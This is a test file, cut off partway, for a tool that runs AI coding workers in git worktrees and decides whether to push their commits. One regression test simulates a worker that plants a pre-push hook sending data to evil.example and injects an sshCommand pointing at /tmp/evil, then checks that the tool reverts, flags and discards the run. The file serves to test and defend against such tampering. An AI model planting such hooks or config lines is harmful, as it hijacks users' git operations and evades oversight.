"""kinds/base tests: prompt sections, Deps.build wiring, run_code_worker, the shared push tail
(``finish_code_worker``) against a real tmp git worktree with fake effects, and flag-once."""

from __future__ import annotations

import asyncio
import shutil
import sys
import types
from collections.abc import Callable
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import pytest

from software_factory.actions import Action, Kind
from software_factory.config import Profile, RepoOverride
from software_factory.discover import Cmd, Verification
from software_factory.effects import GitCommandError, LiveEffects, PushRejected, RecordingEffects
from software_factory.evidence import START, EvidenceData
from software_factory.kinds import KindHandlerError, get_handler
from software_factory.kinds import base as kb
from software_factory.kinds.base import (
    AuthFailure,
    Deps,
    Outcome,
    ProviderUnavailable,
    finish_code_worker,
    flag,
    render_action_section,
    render_candidates_section,
    render_checks_section,
    render_feedback_section,
    render_pr_section,
    render_readiness_section,
    render_verification_section,
    run_code_worker,
    user_prompt,
    worker_failed,
)
from software_factory.notify import Audit, Notifier
from software_factory.paths import ProfilePaths
from software_factory.policy import ToolPolicy
from software_factory.readiness import Readiness, ReadinessCheck
from software_factory.repos import RepoIndex, RepoInfo
from software_factory.resolve import Resolver
from software_factory.runner import RunSummary, WorkerRun, load_prompt
from software_factory.sources.models import Check, Feedback, PullRequest, ReviewThread
from software_factory.state import State
from software_factory.trackers.base import Issue
from software_factory.trackers.linear import LinearTracker
from software_factory.workers.schemas import (
    AcProof,
    BuildOutput,
    CiOutput,
    ConflictOutput,
    RepoPick,
    RvOutput,
    VerificationRun,
)
from software_factory.worktree import Worktree, WorktreeManager

pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="git is not installed")

SLUG = "JaneDoe/repo"
NOW = datetime(2026, 10, 1, 12, 0, tzinfo=UTC)


# ------------------------------------------------------------------------------------- fakes
class FakeEffects:
    def __init__(self, *, push_error: Exception | None = None) -> None:
        self.push_error = push_error
        self.pushes: list[tuple[Worktree, str, str, int | None]] = []
        self.evidence: list[tuple[str, int, str]] = []

    def push(self, wt: Worktree, branch: str, *, kind: str, pr: int | None) -> str:
        if self.push_error is not None:
            raise self.push_error
        self.pushes.append((wt, branch, kind, pr))
        return "newsha"

    def update_pr_evidence(self, repo: str, number: int, section: str) -> None:
        self.evidence.append((repo, number, section))


class FakeWorker:
    def __init__(self, run: WorkerRun | None = None) -> None:
        self.run_result = run or WorkerRun(output={"repo": SLUG, "confidence": 0.9, "reasoning": "r"})
        self.calls: list[dict[str, Any]] = []

    async def __call__(self, **kwargs: Any) -> WorkerRun:
        self.calls.append(kwargs)
        return self.run_result


class FakeGh:
    def auth_check(self) -> None:
        pass


# ---------------------------------------------------------------------------------- fixtures
@pytest.fixture
def paths(tmp_path: Path) -> ProfilePaths:
    return ProfilePaths.for_profile("personal", root=tmp_path / "data root").ensure()


@pytest.fixture
def quiet_profile(make_profile: Callable[..., Path], load: Callable[[str], Profile]) -> Callable[..., Profile]:
    def _build(mode: str = "full", **fields: Any) -> Profile:
        make_profile(
            "personal",
            {"profile": {"mode": mode, "session_timeout_min": 7, **fields}, "notify": {"desktop": False, "slack": False},
             "github": {"owners": ["JaneDoe"], "login": "JaneDoe"}},
            {"CLAUDE_CODE_OAUTH_TOKEN": "sk-ant-oat-test"},
        )  # fmt: skip
        return load("personal")

    return _build


@pytest.fixture
def world(bare_repo_factory: Callable[..., Path], git_repo_factory: Callable[..., Path]) -> dict:
    bare = bare_repo_factory("origin")
    clone = git_repo_factory("repo", origin=bare)
    repo = RepoInfo(slug=SLUG, name="repo", dirname="repo", path=clone, default_branch="main", override=RepoOverride())
    return {"bare": bare, "clone": clone, "repo": repo}


@pytest.fixture
def make_deps(paths: ProfilePaths, quiet_profile: Callable[..., Profile], world: dict) -> Callable[..., Deps]:
    def _make(*, mode: str = "full", effects: Any = None, worker: FakeWorker | None = None) -> Deps:
        profile = quiet_profile(mode)
        state = State(paths.state_db)
        audit = Audit(paths.audit_log, profile.name)
        return Deps(
            profile=profile, paths=paths, state=state, gh=FakeGh(), tracker=None, repos=RepoIndex([world["repo"]]),  # type: ignore[arg-type]
            effects=effects or FakeEffects(), notifier=Notifier(profile, audit), audit=audit,
            wt_manager=WorktreeManager(paths.worktrees), resolver=None, run_worker=worker or FakeWorker(),
            now=lambda: NOW, run_id="run-1",
        )  # fmt: skip

    return _make


def commit_file(git: Callable[..., str], cwd: Path, name: str, content: str, message: str = "change") -> str:
    target = cwd / name
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content, encoding="utf-8")
    git(["add", "-A"], cwd)
    git(["commit", "-q", "-m", message], cwd)
    return git(["rev-parse", "HEAD"], cwd)


def passing() -> list[VerificationRun]:
    return [VerificationRun(command="uv run pytest -q", exit_code=0, passed=True)]


def build_output(**over: Any) -> BuildOutput:
    base: dict[str, Any] = dict(status="done", summary="implemented", push_ok=True, verification=passing(), pr_title="t", pr_summary="s")
    base.update(over)
    return BuildOutput(**base)


def issue_action() -> Action:
    return Action(kind=Kind.BUILD, version="iss-1", issue_id="iss-1", issue_key="ABC-1", title="Build it")


def pr_action(kind: Kind = Kind.CI, number: int = 3) -> Action:
    return Action(kind=kind, version="h1", repo=SLUG, pr=number, title="PR")


# ------------------------------------------------------------------------------- user prompt
def test_user_prompt_blocks_use_verbatim_headings() -> None:
    text = user_prompt([("## Action", "do x"), ("Issue", "body  \n"), ("## Empty", "")])
    assert text == "## Action\n\ndo x\n\n## Issue\n\nbody\n\n## Empty\n\n_(none)_\n"
    assert "## Pull request" in user_prompt([(kb.H_PR, "x")])


def test_render_pr_section_has_the_fields_the_prompts_name() -> None:
    pr = PullRequest(
        repo="o/r", number=5, title="Fix", url="https://github.com/o/r/pull/5", author="bob", state="OPEN",
        head_ref_name="feat", head_ref_oid="abc123", base_ref_name="main", base_ref_oid="def456",
        head_repo="fork/r", mergeable="CONFLICTING", body="Line one\n" * 3, is_draft=True,
    )  # fmt: skip
    text = render_pr_section(pr, issue_key="ABC-9")
    for needle in ("headRefName: `feat`", "headRefOid: `abc123`", "baseRefName: `main`", "baseRefOid: `def456`",
                   "head repo (fork): fork/r", "mergeable: CONFLICTING", "linked issue: ABC-9", "(draft)", "### Body", "Line one"):
        assert needle in text, needle
    assert "### Body" not in render_pr_section(pr, include_body=False)
    assert "_(empty)_" in render_pr_section(pr.model_copy(update={"body": ""}))
    # GitHub slugs are case-insensitive: a head repo in different casing is the same repo, no fork
    same = pr.model_copy(update={"head_repo": "O/R"})
    assert not same.is_fork and "head repo (fork)" not in render_pr_section(same)
    assert "head repo (fork)" not in render_pr_section(pr.model_copy(update={"head_repo": None}))


def test_render_checks_section_with_logs_and_non_actions_checks() -> None:
    failing = [
        {"name": "test (3.12)", "run_id": 11, "job_id": 22, "workflow": "CI", "details_url": "https://x/actions/runs/11/job/22"},
        Check(name="codecov/patch", state="failure", details_url="https://codecov.io/x"),
        {"name": "lint", "run_id": 33, "job_id": None, "workflow": "CI", "details_url": ""},
    ]
    text = render_checks_section(failing, logs={11: "FAIL tests/test_x.py::test_y\n"})
    assert "### test (3.12) (workflow: CI)" in text and "run_id: 11, job_id: 22" in text
    assert "```text\nFAIL tests/test_x.py::test_y\n```" in text
    assert "### codecov/patch" in text and "not a GitHub Actions run" in text and "https://codecov.io/x" in text
    assert "### lint" in text and "gh run view <run_id> --log-failed" in text
    assert render_checks_section([]) == "_(no failing checks)_"
    # the ci kind adds the base branch's latest run of each check's workflow
    with_base = render_checks_section(failing, logs={11: "FAIL"}, base_runs={"CI": "base branch: failure at abc (https://r/1)"})
    assert with_base.count("- base branch: failure at abc (https://r/1)") == 2  # both CI checks, not codecov
    assert "base branch" not in text  # nothing looked up -> no line
    assert "FAIL" in render_checks_section(failing[:1], logs={"11": "FAIL"})  # string keys work too


def test_render_feedback_section_marks_bots_locations_and_threads() -> None:
    items = [
        Feedback(id="c1", author="cursor[bot]", author_is_bot=True, body="Possible bug", created_at="2026-01-01T00:00:00Z",
                 kind="thread", path="src/a.py", line=12, thread_id="t1", url="https://x/c1"),
        Feedback(id="r1", author="alice", body="LGTM but rename", created_at="2026-01-02T00:00:00Z", kind="review"),
    ]  # fmt: skip
    threads = [ReviewThread(id="t1", is_resolved=False, is_outdated=True, path="src/a.py", line=12)]
    text = render_feedback_section(items, threads)
    assert "### c1 by cursor[bot] (bot)" in text and "location: `src/a.py` line 12" in text
    assert "thread: t1 (unresolved) (outdated)" in text and "url: https://x/c1" in text
    assert "### r1 by alice" in text and "kind: review" in text and "LGTM but rename" in text
    assert render_feedback_section([]) == "_(no feedback)_"


def test_render_verification_readiness_candidates_and_action(tmp_path: Path) -> None:
    verification = Verification(
        setup=[Cmd(name="setup", command="uv sync", source="uv.lock")],
        verify=[Cmd(name="test", command="uv run pytest -q", source="CLAUDE.md")],
        source="CLAUDE.md", dev_command="npm run dev", dev_port=5173,
    )  # fmt: skip
    text = render_verification_section(verification)
    assert "- `uv sync` (from uv.lock)" in text and "- test: `uv run pytest -q` (from CLAUDE.md)" in text
    assert "Dev server: `npm run dev` on port 5173" in text
    assert "No verification commands were discovered" in render_verification_section(Verification())

    readiness = Readiness(
        repo=SLUG, score=45, missing=["commands_pass"], flaky=["npm test"],
        checks=[ReadinessCheck(name="commands_pass", ok=False, detail="`npm test` exit 1 | bad", weight=25),
                ReadinessCheck(name="agent_doc_present", ok=True, detail="CLAUDE.md", weight=15)],
        runtime_s=12.5,
    )  # fmt: skip
    text = render_readiness_section(readiness, 60)
    assert text.startswith("Score: 45/100 - LOW (minimum 60)")
    assert "| commands_pass | FAIL | `npm test` exit 1 \\| bad |" in text and "| agent_doc_present | ok | CLAUDE.md |" in text
    assert "Missing: `commands_pass`" in text and "Flaky commands: `npm test`" in text and "12.5s" in text
    assert "OK" in render_readiness_section(readiness.model_copy(update={"score": 80}), 60)
    assert render_readiness_section(None) == "_(readiness not assessed)_"

    a = tmp_path / "alpha"
    a.mkdir()
    (a / "CLAUDE.md").write_text("# Alpha\n\nA game about alpacas.\n\n## Commands\n\nnpm test\n", encoding="utf-8")
    b = tmp_path / "beta"
    b.mkdir()
    repos = RepoIndex([
        RepoInfo(slug="o/alpha", name="alpha", dirname="alpha", path=a, default_branch="main", override=RepoOverride()),
        RepoInfo(slug="o/beta", name="beta", dirname="beta-dir", path=b, default_branch="dev", override=RepoOverride()),
    ])  # fmt: skip
    text = render_candidates_section(repos)
    assert "### o/alpha" in text and "A game about alpacas." in text and "## Commands" not in text
    assert "### o/beta" in text and "local dir: `beta-dir` (default branch `dev`)" in text and "no CLAUDE.md" in text
    assert "o/beta" not in render_candidates_section(repos, [repos.get("alpha")])  # type: ignore[list-item]
    assert render_candidates_section(RepoIndex([])) == "_(no managed repos)_"

    action = Action(kind=Kind.CI, version="h1", repo="o/r", pr=1, title="Fix CI", url="https://x/1")
    text = render_action_section(action, "extra line")
    assert "- kind: `ci`" in text and "- target: o/r#1" in text and "- version: `h1`" in text and "extra line" in text


# ----------------------------------------------------------------------------------- Outcome
def test_outcome_record_handled() -> None:
    assert Outcome(status="done").record_handled and Outcome(status="nothing").record_handled
    for status in ("kept", "flagged", "failed", "skipped", "dry_run"):
        assert not Outcome(status=status).record_handled  # type: ignore[arg-type]


# -------------------------------------------------------------------------------- Deps.build
def test_deps_build_wires_real_objects_with_overrides(paths: ProfilePaths, quiet_profile: Callable[..., Profile], world: dict) -> None:
    profile = quiet_profile()
    worker = FakeWorker()
    deps = Deps.build(profile, paths, dry_run=False, gh=FakeGh(), repos=RepoIndex([world["repo"]]), run_worker=worker)  # type: ignore[arg-type]
    assert deps.state.path == paths.state_db and deps.audit.path == paths.audit_log and deps.audit.profile == "personal"
    assert isinstance(deps.effects, LiveEffects) and deps.wt_manager.root == paths.worktrees
    assert deps.tracker is None and deps.resolver is None  # no LINEAR_API_KEY -> no tracker -> no resolver
    assert deps.run_worker is worker and isinstance(deps.run_id, str) and deps.run_id
    assert isinstance(deps.now(), datetime)
    deps.state.close()
    dry = Deps.build(profile, paths, dry_run=True, gh=FakeGh(), repos=RepoIndex([]), state=State(paths.state_db))  # type: ignore[arg-type]
    assert isinstance(dry.effects, RecordingEffects)
    dry.state.close()
    observe = quiet_profile("observe")
    obs = Deps.build(observe, paths, dry_run=False, gh=FakeGh(), repos=RepoIndex([]), state=State(paths.state_db))  # type: ignore[arg-type]
    assert isinstance(obs.effects, RecordingEffects)
    obs.state.close()


def test_deps_build_wires_linear_tracker_and_resolver_when_the_key_is_present(
    paths: ProfilePaths, make_profile: Callable[..., Path], load: Callable[[str], Profile], world: dict
) -> None:
    toml: dict[str, Any] = {
        "profile": {"mode": "full"},
        "notify": {"desktop": False, "slack": False},
        "github": {"owners": ["JaneDoe"], "login": "JaneDoe"},
    }
    env = {"CLAUDE_CODE_OAUTH_TOKEN": "sk-ant-oat-test", "LINEAR_API_KEY": "lin_api_test"}
    make_profile("personal", toml, env)
    profile = load("personal")
    worker = FakeWorker()
    deps = Deps.build(profile, paths, dry_run=False, gh=FakeGh(), repos=RepoIndex([world["repo"]]), run_worker=worker)  # type: ignore[arg-type]
    assert isinstance(deps.tracker, LinearTracker) and deps.tracker.profile is profile
    assert isinstance(deps.resolver, Resolver) and deps.resolver.tracker is deps.tracker
    assert deps.resolver.picker is not None and deps.resolver.state is deps.state
    assert isinstance(deps.effects, LiveEffects) and deps.effects.tracker is deps.tracker  # writes go through the same tracker
    deps.state.close()

    # linear disabled: no tracker and no resolver even though the key is present
    make_profile("personal", {**toml, "linear": {"enabled": False}}, env)
    off = load("personal")
    deps = Deps.build(off, paths, dry_run=False, gh=FakeGh(), repos=RepoIndex([]), state=State(paths.state_db))  # type: ignore[arg-type]
    assert deps.tracker is None and deps.resolver is None
    deps.state.close()


def test_deps_build_resolver_picker_calls_a_toolless_resolve_worker(
    paths: ProfilePaths, quiet_profile: Callable[..., Profile], world: dict
) -> None:
    profile = quiet_profile()
    worker = FakeWorker()
    tracker = types.SimpleNamespace(name="fake", context_for=lambda issue: f"CONTEXT for {issue.key}")
    deps = Deps.build(profile, paths, dry_run=False, gh=FakeGh(), tracker=tracker, repos=RepoIndex([world["repo"]]), run_worker=worker)  # type: ignore[arg-type]
    assert deps.resolver is not None and deps.resolver.picker is not None
    issue = Issue(id="i1", key="ABC-1", title="Thing", description="d")

    pick = asyncio.run(deps.resolver.picker(issue, [world["repo"]]))

    assert pick == RepoPick(repo=SLUG, confidence=0.9, reasoning="r")
    call = worker.calls[0]
    assert call["kind"] == "resolve" and call["tools_enabled"] is False and call["policy"] is None
    assert call["schema"] is RepoPick and call["profile"] is profile
    assert call["system_append"] == load_prompt("resolve")
    assert call["cwd"] == paths.root / "scratch" and call["cwd"].is_dir()
    assert call["transcript_path"] == paths.transcripts / f"{deps.run_id}-resolve-ABC-1.jsonl"
    assert call["timeout_s"] == 7 * 60
    prompt = call["prompt"]
    assert prompt.index("## Issue") < prompt.index("CONTEXT for ABC-1") < prompt.index("## Candidate repos") < prompt.index(SLUG)

    worker.run_result = WorkerRun(output=None, error="bad json")
    assert asyncio.run(deps.resolver.picker(issue, [world["repo"]])) == RepoPick(repo=None, confidence=0.0, reasoning="resolver worker failed: bad json")
    worker.run_result = WorkerRun(output=None, error="401", auth_failed=True)
    with pytest.raises(AuthFailure):
        asyncio.run(deps.resolver.picker(issue, [world["repo"]]))
    # a rate / usage limit is no "low confidence" pick (that would flag the issue as unresolvable)
    worker.run_result = WorkerRun(output=None, error="rate limited: 429", rate_limited=True)
    with pytest.raises(ProviderUnavailable, match="429"):
        asyncio.run(deps.resolver.picker(issue, [world["repo"]]))
    worker.run_result = WorkerRun(output=None, rate_limited=True)
    with pytest.raises(ProviderUnavailable, match="provider unavailable"):
        asyncio.run(deps.resolver.picker(issue, [world["repo"]]))
    # a pick the session finished stands, whatever rate-limit signal it saw on the way
    worker.run_result = WorkerRun(output={"repo": SLUG, "confidence": 0.8, "reasoning": "r"}, error="429 then retried", rate_limited=True)
    assert asyncio.run(deps.resolver.picker(issue, [world["repo"]])) == RepoPick(repo=SLUG, confidence=0.8, reasoning="r")
    deps.state.close()


# --------------------------------------------------------------------------- run_code_worker
def test_run_code_worker_builds_policy_prompt_timeout_and_transcript(
    make_deps: Callable[..., Deps], world: dict, paths: ProfilePaths
) -> None:
    worker = FakeWorker(WorkerRun(output={"ok": True}, summary=RunSummary(cost_usd=0.2, duration_ms=10)))
    deps = make_deps(worker=worker)
    wt = deps.wt_manager.for_default_branch(world["repo"])
    action = pr_action(Kind.RV, 3)

    run = asyncio.run(run_code_worker(action, deps, repo=world["repo"], wt=wt, kind=Kind.RV, schema=RvOutput, prompt="PROMPT", read_only=True))

    assert run.output == {"ok": True}
    call = worker.calls[0]
    policy = call["policy"]
    assert isinstance(policy, ToolPolicy) and policy.read_only is True and policy.worktree == Path(wt.path).resolve()
    assert not policy.check("Write", {"file_path": str(wt.path / "x.py")}).allow
    assert call["kind"] == "rv" and call["prompt"] == "PROMPT" and call["cwd"] == Path(wt.path)
    assert call["schema"] is RvOutput and call["system_append"] == load_prompt("rv") and call["tools_enabled"] is True
    assert call["timeout_s"] == 7 * 60
    assert call["transcript_path"] == paths.transcripts / "run-1-rv-JaneDoe-repo-3.jsonl"
    events = [r["event"] for r in deps.audit.read()]
    assert events[-2:] == ["worker.start", "worker.end"]
    assert kb.run_stats(run) == {"cost_usd": 0.2, "usage": None, "duration_ms": 10}

    # plan-style: explicit cwd + extra read dirs, no worktree
    scratch = paths.root / "scratch"
    asyncio.run(run_code_worker(issue_action(), deps, repo=None, wt=None, kind="plan", schema=RvOutput, prompt="P",
                                read_only=True, cwd=scratch, extra_read_dirs=[world["clone"]]))  # fmt: skip
    call = worker.calls[1]
    assert call["cwd"] == scratch and scratch.is_dir()
    assert call["policy"].check("Read", {"file_path": str(world["clone"] / ".env")}).allow
    with pytest.raises(ValueError):
        asyncio.run(run_code_worker(issue_action(), deps, repo=None, wt=None, kind="plan", schema=RvOutput, prompt="P"))


def test_run_code_worker_auth_failure_raises_and_removes_the_worktree(
    make_deps: Callable[..., Deps], world: dict, paths: ProfilePaths
) -> None:
    deps = make_deps(worker=FakeWorker(WorkerRun(output=None, error="authentication failed", auth_failed=True)))
    wt = deps.wt_manager.for_default_branch(world["repo"])
    with pytest.raises(AuthFailure, match="authentication failed"):
        asyncio.run(run_code_worker(pr_action(), deps, repo=world["repo"], wt=wt, kind=Kind.CI, schema=CiOutput, prompt="p"))
    # the wave stops and the next tick repeats this: the checkout must not pile up under wt/
    assert not wt.path.exists() and list(paths.worktrees.iterdir()) == []
    assert deps.state.flags() == [] and deps.state.kept_worktree(pr_action().target) is None


def test_run_code_worker_rate_limited_raises_provider_unavailable_and_removes_the_worktree(
    make_deps: Callable[..., Deps], world: dict, paths: ProfilePaths
) -> None:
    deps = make_deps(worker=FakeWorker(WorkerRun(output=None, error="usage limit reached", rate_limited=True)))
    wt = deps.wt_manager.for_default_branch(world["repo"])
    with pytest.raises(ProviderUnavailable, match="usage limit reached"):
        asyncio.run(run_code_worker(pr_action(), deps, repo=world["repo"], wt=wt, kind=Kind.CI, schema=CiOutput, prompt="p"))
    assert not wt.path.exists() and list(paths.worktrees.iterdir()) == []
    assert deps.state.flags() == [] and deps.state.kept_worktree(pr_action().target) is None
    # without a worktree (plan / resolve style) it raises all the same, with a default message
    deps.run_worker = FakeWorker(WorkerRun(output=None, rate_limited=True))
    with pytest.raises(ProviderUnavailable, match=r"provider unavailable \(plan worker\)"):
        asyncio.run(run_code_worker(issue_action(), deps, repo=None, wt=None, kind="plan", schema=RvOutput, prompt="P",
                                    read_only=True, cwd=paths.root / "scratch"))  # fmt: skip
    assert not issubclass(ProviderUnavailable, AuthFailure)  # its own flag, its own dedupe


def test_run_code_worker_keeps_a_finished_sessions_output_despite_a_rate_limit_signal(
    make_deps: Callable[..., Deps], world: dict, paths: ProfilePaths, git: Callable[..., str]
) -> None:
    """Regression: a session that hit a 429 mid-way, retried and finished with valid structured
    output used to raise ``ProviderUnavailable``: the worktree (with the worker's commits) was
    removed and the finished work discarded. Only a run with *no* output is a provider outage."""

    class Committing(FakeWorker):
        async def __call__(self, **kwargs: Any) -> WorkerRun:
            commit_file(git, Path(kwargs["cwd"]), "src/feature.py", "x = 1\n")
            return await super().__call__(**kwargs)

    output = build_output().model_dump(mode="json")
    deps = make_deps(worker=Committing(WorkerRun(output=output, error="rate limited (429), retried", rate_limited=True)))
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")

    run = asyncio.run(run_code_worker(issue_action(), deps, repo=world["repo"], wt=wt, kind=Kind.BUILD, schema=BuildOutput, prompt="p"))

    assert run.output == output and wt.path.exists() and len(deps.wt_manager.new_commits(wt)) == 1
    assert deps.state.flags() == []
    noted = [r for r in deps.audit.read() if r["event"] == "worker.rate_limited_with_output"]
    assert len(noted) == 1 and noted[0]["kind"] == "build" and "429" in noted[0]["error"]
    # ... and the shared tail pushes it like any other finished run
    assert finish(deps, issue_action(), world["repo"], wt, build_output(), run=run).status == "done"
    assert [p[1] for p in deps.effects.pushes] == ["factory/abc-1"]  # type: ignore[attr-defined]

    # a finished session that tampered with the git dir is a verdict, not an outage: its output is
    # discarded (the handler fails it, an attempt) and no ProviderUnavailable hides that
    class Planting(FakeWorker):
        async def __call__(self, **kwargs: Any) -> WorkerRun:
            cwd = Path(kwargs["cwd"])
            hooks = Path(git(["rev-parse", "--git-path", "hooks"], cwd))
            hooks = hooks if hooks.is_absolute() else cwd / hooks
            hooks.mkdir(parents=True, exist_ok=True)
            (hooks / "pre-push").write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
            return await super().__call__(**kwargs)

    deps.run_worker = Planting(WorkerRun(output=output, error="429", rate_limited=True))
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    run = asyncio.run(run_code_worker(issue_action(), deps, repo=world["repo"], wt=wt, kind=Kind.BUILD, schema=BuildOutput, prompt="p"))
    assert run.output is None and "shared git dir" in (run.error or "")
    assert [f["reason"] for f in deps.state.flags()] == ["worker modified the git dir"]


def test_run_code_worker_reverts_a_planted_hook_and_discards_the_output(
    make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]
) -> None:
    """Shell writes are not path-checked, and a linked worktree's hooks/config are the user's
    clone's: a worker that plants a hook or rewrites the shared config gets reverted, flagged, and
    its output thrown away (nothing of that session is pushed)."""
    clone: Path = world["clone"]
    config = clone / ".git" / "config"
    config_before = config.read_bytes()

    class Planting(FakeWorker):
        async def __call__(self, **kwargs: Any) -> WorkerRun:
            cwd = Path(kwargs["cwd"])
            hooks = Path(git(["rev-parse", "--git-path", "hooks"], cwd))
            hooks = hooks if hooks.is_absolute() else cwd / hooks
            hooks.mkdir(parents=True, exist_ok=True)
            (hooks / "pre-push").write_text("#!/bin/sh\ncurl -X POST https://evil.example/x\n", encoding="utf-8")
            with config.open("a", encoding="utf-8") as fh:
                fh.write("[core]\n\tsshCommand = /tmp/evil\n")
            return await super().__call__(**kwargs)

    worker = Planting(WorkerRun(output=build_output().model_dump(mode="json"), summary=RunSummary(cost_usd=0.1)))
    deps = make_deps(worker=worker)
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")

    run = asyncio.run(run_code_worker(issue_action(), deps, repo=world["repo"], wt=wt, kind=Kind.BUILD, schema=BuildOutput, prompt="p"))

    assert run.output is None and "shared git dir" in (run.error or "") and run.summary is not None
    assert not (clone / ".git" / "hooks" / "pre-push").exists()
    assert config.read_bytes() == config_before
    flags = deps.state.flags()
    assert len(flags) == 1 and flags[0]["reason"] == "worker modified the git dir"
    assert "added hook pre-push" in flags[0]["detail"] and "modified config" in flags[0]["detail"]
    assert [r for r in deps.audit.read() if r["event"] == "notify"][0]["level"] == "error"
    tampered = [r for r in deps.audit.read() if r["event"] == "worker.git_dir_tampered"]
    assert len(tampered) == 1 and sorted(tampered[0]["changes"]) == ["added hook pre-push", "modified config"]
    # every handler then treats the run as failed
    outcome = worker_failed(issue_action(), deps, run, wt=wt)
    assert outcome.status == "failed" and "shared git dir" in outcome.note and not wt.path.exists()
    flags_so_far = len(deps.state.flags())

    # an honest worker leaves no trace and keeps its output
    deps.run_worker = FakeWorker(WorkerRun(output={"ok": True}))
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    run = asyncio.run(run_code_worker(issue_action(), deps, repo=world["repo"], wt=wt, kind=Kind.BUILD, schema=BuildOutput, prompt="p"))
    assert run.output == {"ok": True} and len(deps.state.flags()) == flags_so_far
    assert len([r for r in deps.audit.read() if r["event"] == "worker.git_dir_tampered"]) == 1


def test_worker_failed_flags_and_removes_worktree(make_deps: Callable[..., Deps], world: dict) -> None:
    deps = make_deps()
    wt = deps.wt_manager.for_default_branch(world["repo"])
    run = WorkerRun(output=None, error="worker timed out after 60s", timed_out=True, summary=RunSummary(cost_usd=1.0))
    outcome = worker_failed(pr_action(), deps, run, wt=wt)
    assert outcome.status == "failed" and "timed out" in outcome.note and outcome.cost_usd == 1.0
    assert not wt.path.exists()
    assert deps.state.flags()[0]["reason"] == "worker timed out"


# ------------------------------------------------------------------------ finish_code_worker
def finish(deps: Deps, action: Action, repo: RepoInfo, wt: Worktree, output: Any, **kw: Any) -> Outcome:
    kw.setdefault("branch", wt.branch or "factory/x")
    kw.setdefault("pr_number", None)
    kw.setdefault("factory_pr", False)
    return asyncio.run(finish_code_worker(action, deps, repo=repo, wt=wt, output=output, **kw))


def test_finish_pushes_when_policy_allows_and_removes_worktree(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    deps = make_deps()
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "src/feature.py", "x = 1\n")
    run = WorkerRun(output={}, summary=RunSummary(cost_usd=0.3, usage={"input_tokens": 5}, duration_ms=99))

    outcome = finish(deps, issue_action(), world["repo"], wt, build_output(), run=run)

    assert outcome.status == "done" and outcome.pushed is True and outcome.note == "implemented"
    assert outcome.cost_usd == 0.3 and outcome.usage == {"input_tokens": 5} and outcome.duration_ms == 99
    effects: FakeEffects = deps.effects  # type: ignore[assignment]
    assert [(p[1], p[2], p[3]) for p in effects.pushes] == [("factory/abc-1", "build", None)]
    assert effects.evidence == []  # not a factory PR
    assert not wt.path.exists() and deps.state.kept_worktree("ABC-1") is None and deps.state.flags() == []


def test_finish_refreshes_evidence_on_factory_prs(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    deps = make_deps()
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "src/feature.py", "x = 1\ny = 2\n")
    output = CiOutput(status="done", summary="fixed", push_ok=True, head_verified=True, verification=passing())

    outcome = finish(deps, pr_action(Kind.CI, 5), world["repo"], wt, output, pr_number=5, factory_pr=True, screenshots=[("after: home", "https://u/a.png")])

    assert outcome.status == "done" and outcome.pushed
    effects: FakeEffects = deps.effects  # type: ignore[assignment]
    assert effects.pushes[0][3] == 5 and effects.pushes[0][2] == "ci"
    assert len(effects.evidence) == 1
    repo, number, section = effects.evidence[0]
    assert (repo, number) == (SLUG, 5) and section.startswith(START)
    assert "`src/feature.py`" in section and "kind ci, run run-1, head newsha" in section
    assert "+2 / -0 lines" in section and "https://u/a.png" in section and "`uv run pytest -q`" in section


def test_finish_keeps_worktree_and_flags_when_policy_refuses(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    deps = make_deps()
    wt = deps.wt_manager.for_new_branch(world["repo"], "factory/abc-1")
    commit_file(git, wt.path, "src/feature.py", "x = 1\n")
    output = build_output(push_ok=False, push_reasons=["touches billing logic"])

    outcome = finish(deps, issue_action(), world["repo"], wt, output)

    assert outcome.status == "kept" and not outcome.pushed
    assert "push_ok" in outcome.note and "touches billing logic" in outcome.note and str(wt.path) in outcome.note
    assert deps.effects.pushes == []  # type: ignore[attr-defined]
    assert wt.path.exists()
    kept = deps.state.kept_worktree("ABC-1")
    assert kept is not None and kept["path"] == str(wt.path) and kept["kind"] == "build" and "push_ok" in kept["reason"]
    flags = deps.state.flags()
    assert len(flags) == 1 and flags[0]["reason"] == "push refused" and str(wt.path) in flags[0]["detail"]
    assert "touches billing logic" in flags[0]["detail"]
    # the kept checkout is a detached HEAD: the flag says how to keep the commits when continuing by
    # hand, on a local branch name that cannot collide with a ``factory/abc-1`` the clone may have
    assert "detached HEAD: `git switch -c factory/abc-1-factory` to continue by hand" in flags[0]["detail"]
    assert "git push origin" not in flags[0]["detail"]  # a build branch has no PR to push to by hand
    assert [r for r in deps.audit.read() if r["event"] == "notify"][0]["title"] == "push refused"
    assert deps.state.attempts("ABC-1", "build", "iss-1") == 0  # the dispatcher records attempts, not the tail


def test_detached_head_hint_never_reuses_the_branch_name_and_offers_the_push_for_prs() -> None:
    """``git switch -c <branch>`` fails when the clone already has that local branch (or has it
    checked out in the main worktree), which is the usual case for the PR head branch."""
    assert kb.detached_head_hint("feat") == "detached HEAD: `git switch -c feat-factory` to continue by hand"
    assert kb.detached_head_hint("feat", pr=True) == (
        "detached HEAD: `git switch -c feat-factory` to continue by hand, "
        "or review and `git push origin HEAD:refs/heads/feat` yourself"
    )
    assert "`git switch -c <branch>-factory`" in kb.detached_head_hint(None)


def test_finish_keeps_a_pr_worktree_with_the_pr_hint(make_deps: Callable[..., Deps], world: dict, git: Callable[..., str]) -> None:
    deps = make_deps()
    wt = deps.wt_manager.for_new_branch(world["repo"], "feat")
    commit_file(git, wt.path, "src/feature.py", "x = 1\n")
    output = CiOutput(status="done", summary="fixed", push_ok=False, push_reasons=["prod logic"], head_verified=True, verification=passing())

    outcome = finish(deps, pr_action(Kind.CI, 5), world["repo"], wt, output, pr_number=5, branch="feat")

    assert outcome.status == "kept"
    detail = deps.state.flags()[0]["detail"]
